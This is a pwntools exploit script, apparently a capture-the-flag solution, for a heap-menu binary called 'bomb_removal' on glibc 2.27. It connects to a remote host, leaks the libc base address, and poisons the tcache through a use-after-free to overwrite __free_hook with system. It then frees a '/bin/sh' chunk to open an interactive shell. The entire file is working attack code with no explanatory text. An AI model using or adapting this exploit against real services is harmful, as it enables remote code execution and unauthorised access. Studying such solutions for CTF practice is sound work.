from pwn import *

context.binary = exe = ELF('./bomb_removal')
libc = ELF('./libc6_2.27-3ubuntu1.6_amd64.so')

io = remote('34.64.33.48', 30001)
#io = process()
#gdb.attach(io, api=True)

def malloc(cnt):
    io.sendlineafter(b'>> ', b'1')
    io.recvuntil(b'name: ')
    io.send(cnt)

def free():
    io.sendlineafter(b'>> ', b'2')

def leak():
    io.sendlineafter(b'>> ', b'3')
    io.recvuntil(b'name: ')
    return io.recvuntil(b'--')[:-2]

def write(cnt):
    io.sendlineafter(b'>> ', b'4')
    io.recvuntil(b'name: ')
    io.send(cnt)

io.recvuntil(b'0x')
libc.address = int(io.recvline(keepends=False), 16) - libc.sym['_IO_2_1_stdout_']
log.info(f'Libc base: {hex(libc.address)}')
free()
write(p64(libc.sym['__free_hook']))
malloc(b'a')
malloc(p64(libc.sym['system']))
malloc(b'/bin/sh\0')
free()
io.interactive()